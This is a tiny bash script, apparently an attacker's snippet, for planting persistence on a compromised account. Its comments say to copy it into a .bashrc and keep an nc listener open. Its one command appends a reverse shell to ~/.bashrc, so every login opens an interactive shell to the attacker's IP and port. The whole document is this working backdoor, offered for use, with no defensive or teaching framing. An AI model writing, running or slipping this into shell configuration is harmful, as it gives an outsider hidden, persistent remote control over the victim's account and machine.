#/bin/bash
#copy into a .bashrc, remember to have nc -lvnp port for when user logs in
#set or replace 'ip' and 'port'
echo 'bash -i >& /dev/tcp/$ip/$port 0>&1' >> ~/.bashrc
